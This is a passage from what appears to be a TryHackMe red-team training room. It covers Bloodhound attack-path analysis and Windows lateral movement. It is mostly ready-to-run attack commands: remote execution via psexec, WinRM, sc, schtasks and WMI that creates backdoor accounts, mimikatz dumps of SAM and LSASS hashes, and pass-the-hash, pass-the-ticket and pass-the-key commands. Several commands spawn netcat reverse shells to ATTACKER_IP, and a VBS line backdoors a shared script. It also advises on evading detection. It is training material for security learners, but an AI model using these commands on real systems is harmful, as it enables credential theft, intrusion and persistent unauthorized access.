deeper dive into what Bloodhound is showing us. There is an AD user account with the username of **T0_TINUS.GREEN**, that is a member of the group **Tier 0 ADMINS**. But, this group is a nested group into the **DOMAIN ADMINS** group, meaning all users that are part of the **Tier 0 ADMINS** group are effectively DAs.

Furthermore, there is an additional AD account with the username of **ADMINISTRATOR** that is part of the **DOMAIN ADMINS**
 group. Hence, there are two accounts in our attack surface that we can 
probably attempt to compromise if we want to gain DA rights. Since the **ADMINISTRATOR** account is a built-in account, we would likely focus on the user account instead.

Each AD
 object that was discussed in the previous tasks can be a node in 
Bloodhound, and each will have a different icon depicting the type of 
object it is. If we want to formulate an attack path, we need to look at
 the available edges between the current position and privileges we have
 and where we want to go. Bloodhound has various available edges that 
can be accessed by the filter icon:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c21ccdbdd84a6e709d39fdff14764cea.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c21ccdbdd84a6e709d39fdff14764cea.png)

These
 are also constantly being updated as new attack vectors are discovered.
 We will be looking at exploiting these different edges in a future 
network. However, let's look at the most basic attack path using only 
the default and some special edges. We will run a search in Bloodhound 
to enumerate the attack path. Press the path icon to allow for path 
searching.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d3fab8519fda4ac61db80c35274c53a1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d3fab8519fda4ac61db80c35274c53a1.png)

Our Start Node would be our AD username, and our End Node will be the **Tier 1 ADMINS** group since this group has administrative privileges over servers.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b7ae2e4f8e1824e25e69fa69d95c4a4e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b7ae2e4f8e1824e25e69fa69d95c4a4e.png)

If there is no available attack path using the selected edge filters, Bloodhound will display "No Results Found". **Note,
 this may also be due to a Bloodhound/Sharphound mismatch, meaning the 
results were not properly ingested. Please make use of Bloodhound 
v4.1.0.** However, in our case, Bloodhound shows an attack path. It shows that one of the **T1 ADMINS, ACCOUNT,**  broke the tiering model by using their credentials to authenticate to **THMJMP1**, which is a workstation. It also shows that any user that is part of the **DOMAIN USERS** group, including our AD account, has the ability to RDP into this host.

We could do something like the following to exploit this path:

1. Use our AD credentials to RDP into **THMJMP1**.
2. Look for a privilege escalation vector on the host that would provide us with Administrative access.
3. Using Administrative access, we can use credential harvesting techniques and tools such as Mimikatz.
4. Since the T1 Admin has an active session on **THMJMP1**, our credential harvesting would provide us with the NTLM hash of the associated account.

This
 is a straightforward example. The attack paths may be relatively 
complex in normal circumstances and require several actions to reach the
 final goal. If you are interested in the exploits associated with each 
edge, the following [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) provides an excellent guide. Bloodhound is an incredibly powerful AD
 enumeration tool that provides in-depth insights into the AD structure 
of an attack surface. It is worth the effort to play around with it and 
learn its various features.

# Session Data Only

The structure of

AD

does not change 
very often in large organisations. There may be a couple of new employees, 
but the overall structure of OUs, Groups, Users, and permission will 
remain the same.

However, the one thing that does
 change constantly is active sessions and LogOn events. Since Sharphound
 creates a point-in-time snapshot of the AD
 structure, active session data is not always accurate since some users 
may have already logged off their sessions or new users may have 
established new sessions. This is an essential thing to note and is why 
we would want to execute Sharphound at regular intervals.

A
 good approach is to execute Sharphound with the "All" collection method
 at the start of your assessment and then execute Sharphound at least 
twice a day using the "Session" collection method. This will provide you
 with new session data and ensure that these runs are faster since they 
do not enumerate the entire AD
 structure again. The best time to execute these session runs is at 
around 10:00, when users have their first coffee and start to work and 
again around 14:00, when they get back from their lunch breaks but 
before they go home.

You can clear stagnant session data in
 Bloodhound on the Database Info tab by clicking the "Clear Session 
Information" before importing the data from these new Sharphound runs.

# Benefits

- Provides a GUI for AD enumeration.
- Has the ability to show attack paths for the enumerated AD information.
- Provides more profound insights into AD objects that usually require several manual queries to recover.

# Drawbacks

- Requires the execution of Sharphound, which is noisy and can often be detected by AV or EDR solutions.

**LATERAL MOVEMENT AND PIVOTING**

**Moving Through the Network**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/927cb0238daf85062962ecaa1714e80a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/927cb0238daf85062962ecaa1714e80a.png)

## What is Lateral Movement?

Simply put, lateral movement is the group of techniques used by 
attackers to move around a network. Once an attacker has gained access 
to the first machine of a network, moving is essential for many reasons,
 including the following: - Reaching our goals as attackers - Bypassing 
network restrictions in place - Establishing additional points of entry 
to the network - Creating confusion and avoid detection.

While many cyber kill chains reference lateral movement as an 
additional step on a linear process, it is actually part of a cycle. 
During this cycle, we use any available credentials to perform lateral 
movement, giving us access to new machines where we elevate privileges 
and extract credentials if possible. With the newfound credentials, the 
cycle starts again.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/beccc46f65b8d16117d3d62f5c5dc380.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/beccc46f65b8d16117d3d62f5c5dc380.png)

Usually, we will repeat this cycle several times before reaching our 
final goal on the network. If our first foothold is a machine with very 
little access to other network resources, we might need to move 
laterally to other hosts that have more privileges on the network.

## A Quick Example

Suppose we are performing a red team engagement where our final goal 
is to reach an internal code repository, where we got our first 
compromise on the target network by using a phishing campaign. Usually, 
phishing campaigns are more effective against non-technical users, so 
our first access might be through a machine in the Marketing department.

Marketing workstations will typically be limited through firewall 
policies to access any critical services on the network, including 
administrative protocols, database ports, monitoring services or any 
other that aren't required for their day to day labour, including code 
repositories.

To reach sensitive hosts and services, we need to move to other hosts
 and pivot from there to our final goal. To this end, we could try 
elevating privileges on the Marketing workstation and extracting local 
users' password hashes. If we find a local administrator, the same 
account may be present on other hosts. After doing some recon, we find a
 workstation with the name DEV-001-PC. We use the local administrator's 
password hash to access DEV-001-PC and confirm it is owned by one of the
 developers in the company. From there, access to our target code 
repository is available.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ef601e2332f96e45c64b3baa8d6349.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ef601e2332f96e45c64b3baa8d6349.png)

Notice
 that while lateral movement might need to be used to circumvent 
firewall restrictions, it is also helpful in evading detection. In our 
example, even if the Marketing workstation had direct access to the code
 repository, it is probably desirable to connect through the developer's
 PC. This behaviour would be less suspicious from the standpoint of a 
blue team analyst checking login audit logs.

## The Attacker's Perspective

There are several ways in which an attacker can move laterally. The simplest way would be to use standard administrative protocols like WinRM, RDP,
 VNC or SSH to connect to other machines around the network. This 
approach can be used to emulate regular users' behaviours somewhat as 
long as some coherence is maintained when planning where to connect with
 what account. While a user from IT connecting to the web server via RDP
 might be usual and go under the radar, care must be taken not to 
attempt suspicious connections (e.g. why is the local admin user connecting to the DEV-001-PC from the Marketing-PC?).

Attackers nowadays also have other methods of moving laterally while 
making it somewhat more challenging for the blue team to detect what is 
happening effectively.
 While no technique should be considered infallible, we can at least 
attempt to be as silent as possible. In the following tasks, we will 
look at some of the most common lateral movement techniques available.

## Administrators and UAC

While performing most of the lateral movement techniques introduced 
throughout the room, we will mainly use administrator credentials. While
 one might expect that every single administrator account would serve 
the same purpose, a distinction has to be made between two types of 
administrators:

- Local accounts part of the local Administrators group
- Domain accounts part of the local Administrators group

The differences we are interested in are restrictions imposed by **User Account Control (UAC)**
 over local administrators (except for the default Administrator 
account). By default, local administrators won't be able to remotely 
connect to a machine and perform administrative tasks unless using an 
interactive session through RDP.
 Windows will deny any administrative task requested via RPC, SMB or 
WinRM since such administrators will be logged in with a filtered medium
 integrity token, preventing the account from doing privileged actions. 
The only local account that will get full privileges is the default 
Administrator account.

Domain accounts with local administration privileges won't be subject
 to the same treatment and will be logged in with full administrative 
privileges.

This security feature can be disabled if desired, and sometimes
 you will find no difference between local and domain accounts in the 
administrator's group. Still, it's essential to keep in mind that should
 some of the lateral movement techniques fail, it might be due to using a
 non-default local administrator where UAC is enforced. You can read more details about this security feature [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction).

**Spawning Processes Remotely**

This task will look at 
the available methods an attacker has to spawn a process remotely, 
allowing them to run commands on machines where they have valid 
credentials. Each of the techniques discussed uses slightly different 
ways to achieve the same purpose, and some of them might be a better fit
 for some specific scenarios.

## Psexec

- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

Psexec has been the go-to method when needing to execute processes 
remotely for years. It allows an administrator user to run commands 
remotely on any PC where he has access. Psexec is one of many 
Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

The way psexec works is as follows:

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)

To run psexec, we only need to supply the required administrator 
credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\tools` in THMJMP2 for your convenience):

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

## Remote Process Creation Using WinRM

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol used to 
send Powershell commands to Windows hosts remotely. Most Windows Server 
installations will have WinRM enabled by default, making it an 
attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command:

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs 
ScriptBlocks remotely via WinRM. Credentials must be passed through a 
PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

## Remotely Creating Services Using sc

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands 
since they execute a command when started. While a service executable is
 technically different from a regular application, if we configure a 
Windows service to run any application, it will still execute it and 
fail afterwards.

We can create a service on a remote host with sc.exe, a standard tool
 available in Windows. When using sc, it will try to connect to the 
Service Control Manager (SVCCTL) remote service program through RPC in 
several ways:

1. A connection attempt will be made using DCE/RPC. The client will
first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the
SVCCTL service program. The EPM will then respond with the IP and port
to connect to SVCCTL, which is usually a dynamic port in the range of
49152-65535.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png)

1. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)

We can create and start a service named "THMservice" using the following commands:

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

The "net user" command will be executed when the service is started, 
creating a new local user on the system. Since the operating system is 
in charge of starting the service, you won't be able to look at the 
command output.

To stop and delete the service, we can then execute the following commands:

```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

## Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create
 and run one remotely with schtasks, available in any Windows 
installation. To create a task named THMtask1, we can use the following 
commands:

```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00

schtasks /s TARGET /run /TN "THMtask1"

```

We set the schedule type (/sc) to ONCE, which means the task is 
intended to be run only once at the specified time and date. Since we 
will be running the task manually, the starting date (/sd) and starting 
time (/st) won't matter much anyway.

Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.

Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:

```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

**Moving Laterally Using WMI**

We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI).
 WMI is Windows implementation of Web-Based Enterprise Management 
(WBEM), an enterprise standard for accessing management information 
across devices.

In simpler terms, WMI
 allows administrators to perform standard management tasks that 
attackers can abuse to perform lateral movement in various ways, which 
we'll discuss.

## Connecting to WMI From Powershell

Before being able to connect to WMI
 using Powershell commands, we need to create a PSCredential object with
 our user and password. This object will be stored in the $credential 
variable and utilised throughout the techniques on this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI
 session from Powershell, we can use the following commands and store 
the session on the $Session variable, which we will use throughout the 
room on the different techniques:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

## Remote Process Creation Using WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:

```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```

## Creating Services Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

And then, we can get a handle on the service and start it with the following commands:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Creating Scheduled Tasks Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Installing MSI packages through WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:

```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

**Use of Alternate Authentication Material**

By alternate 
authentication material, we refer to any piece of data that can be used 
to access a Windows account without actually knowing a user's password 
itself. This is possible because of how some authentication protocols 
used by Windows networks work. In this task, we will take a look at a 
couple of alternatives available to log as a user when either of the 
following authentication protocols is available on the network:

- NTLM authentication
- Kerberos authentication

**Note:** During this task, you are assumed to be familiar with 
the methods and tools to extract credentials from a host. Mimikatz will 
be used as the tool of choice for credential extraction throughout the 
room.

## NTLM Authentication

Before diving into the actual lateral movement techniques, let's take a look at how NTLM authentication works:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9434c96e1bc0519f8d851b44d85b6702.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9434c96e1bc0519f8d851b44d85b6702.png)

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a
response to the challenge and sends it back to the server for
verification.
4. The server forwards both the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they
both match, the client is authenticated; otherwise, access is denied.
The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

**Note:** The described process applies when using a 
domain account. If a local account is used, the server can verify the 
response to the challenge itself without requiring interaction with the 
domain controller since it has the password hash stored locally on its 
SAM.

## Pass-the-Hash

As a result of extracting credentials from a host where we have
 attained administrative privileges (by using mimikatz or similar 
tools), we might get clear-text passwords or hashes that can be easily 
cracked. However, if we aren't lucky enough, we will end up with 
non-cracked NTLM password hashes.

Although it may seem we can't really use those hashes, the NTLM
 challenge sent during authentication can be responded to just by 
knowing the password hash. This means we can authenticate without 
requiring the plaintext password to be known. Instead of having to crack
 NTLM hashes, if the Windows domain is configured to use NTLM 
authentication, we can **Pass-the-Hash** (PtH) and authenticate successfully.

To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.

**Extracting NTLM hashes from local SAM:**

This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.

THMJMP2: Powershell

```
mimikatz # privilege::debugmimikatz # token::elevatemimikatz # lsadump::sam   RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

**Extracting NTLM hashes from LSASS memory:**

This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.

THMJMP2: Powershell

```
mimikatz # privilege::debugmimikatz # token::elevatemimikatz # sekurlsa::msv Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

We can then use the extracted hashes to perform a PtH attack by using
 mimikatz to inject an access token for the victim user on a reverse 
shell (or any other command you like) as follows:

```
mimikatz # token::revertmimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Notice we used `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.

This would be the equivalent of using `runas /netonly`
 but with a hash instead of a password and will spawn a new reverse 
shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

AttackBox

```
user@AttackBox$ nc -lvp 5555
```

Interestingly, if you run the whoami command on this shell, it will 
still show you the original user you were using before doing PtH, but 
any command run from here will actually use the credentials we injected 
using PtH.

**Passing the Hash Using Linux:**

If you have access to a linux box (like your AttackBox), several 
tools have built-in support to perform PtH using different protocols. 
Depending on which services are available to you, you can do the 
following:

*Connect to RDP using PtH:*

```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

*Connect via psexec using PtH:*

```
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Note:** Only the linux version of psexec support PtH.

*Connect to WinRM using PtH:*

```
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

## Kerberos Authentication

Let's have a quick look at how Kerberos authentication works on Windows networks:

1. The user sends his username and a timestamp encrypted using a key derived from his password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
    
    The KDC will create and send back a **Ticket Granting Ticket (TGT)**,
     allowing the user to request tickets to access specific services 
    without passing their credentials to the services themselves. Along with
     the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.
    
    Notice the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT
     includes a copy of the Session Key as part of its contents, and the KDC
     has no need to store the Session Key as it can recover a copy by 
    decrypting the TGT if needed.
    

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png)

1. When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service for
which they were created. To request a TGS, the user will send his
username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.
    
    As a result, the KDC will send us a TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**.
     The Service Owner is the user or machine account under which the 
    service runs. The TGS contains a copy of the Service Session Key on its 
    encrypted contents so that the Service Owner can access it by decrypting
     the TGS.
    

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png)

1. The TGS can then be sent to the desired service to authenticate and
establish a connection. The service will use its configured account's
password hash to decrypt the TGS and validate the Service Session Key.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png)

## Pass-the-Ticket

Sometimes it will be possible to extract Kerberos
 tickets and session keys from LSASS memory using mimikatz. The process 
usually requires us to have SYSTEM privileges on the attacked machine 
and can be done as follows:

```
mimikatz # privilege::debugmimikatz # sekurlsa::tickets /export
```

Notice that if we only had access to a ticket but not its 
corresponding session key, we wouldn't be able to use that ticket; 
therefore, both are necessary.

While mimikatz can extract any TGT
 or TGS available from the memory of the LSASS process, most of the 
time, we'll be interested in TGTs as they can be used to request access 
to any services the user is allowed to access. At the same time, TGSs 
are only good for a specific service. Extracting TGTs will require us to
 have administrator's credentials, and extracting TGSs can be done with a
 low-privileged account (only the ones assigned to that account).

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:

```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Injecting tickets in our own session doesn't require administrator 
privileges. After this, the tickets will be available for any tools we 
use for lateral movement. To check if the tickets were correctly 
injected, you can use the klist command:

THMJMP2: Powershell

```
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

## Overpass-the-hash / Pass-the-Key

This kind of attack is similar to PtH but applied to Kerberos networks.

When a user requests a TGT,
 they send a timestamp encrypted with an encryption key derived from 
their password. The algorithm used to derive this key can be either DES 
(disabled by default on current Windows versions), RC4, AES128 or 
AES256, depending on the installed Windows version and Kerberos 
configuration. If we have any of those keys, we can ask the KDC for a 
TGT without requiring the actual password, hence the name **Pass-the-key (PtK)**.

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:

```
mimikatz # privilege::debugmimikatz # sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):

**If we have the RC4 hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES128 hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**If we have the AES256 hash:**

```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Notice that when using RC4, the key will be equal to the NTLM
 hash of a user. This means that if we could extract the NTLM hash, we 
can use it to request a TGT as long as RC4 is one of the enabled 
protocols. This particular variant is usually known as **Overpass-the-Hash (OPtH)**.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

AttackBox

```
user@AttackBox$ nc -lvp 5556
```

Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.

**Abusing User Behaviour**

Under certain 
circumstances, an attacker can take advantage of actions performed by 
users to gain further access to machines in the network. While there are
 many ways this can happen, we will look at some of the most common 
ones.

## Abusing Writable Shares

It is quite common to find network shares that legitimate users use 
to perform day-to-day tasks when checking corporate environments. If 
those shares are writable for some reason, an attacker can plant 
specific files to force users into executing any arbitrary payload and 
gain access to their machines.

One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png)

The rationale behind this is that the administrator can maintain an 
executable on a network share, and users can execute it without copying 
or installing the application to each user's machine. If we, as 
attackers, have write permissions over such scripts or executables, we 
can backdoor them to force users to execute any payload we want.

Although the script or executable is hosted on a server, when a user 
opens the shortcut on his workstation, the executable will be copied 
from the server to its `%temp%` folder and executed on the 
workstation. Therefore any payload will run in the context of the final 
user's workstation (and logged-in user account).

### Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a 
copy of nc64.exe on the same share and inject the following code in the 
shared script:

```
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

### Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, you can 
download it from the share and use msfvenom to inject a backdoor into 
it. The binary will still work as usual but execute an additional 
payload silently. To create a backdoored putty.exe, we can use the 
following command:

```
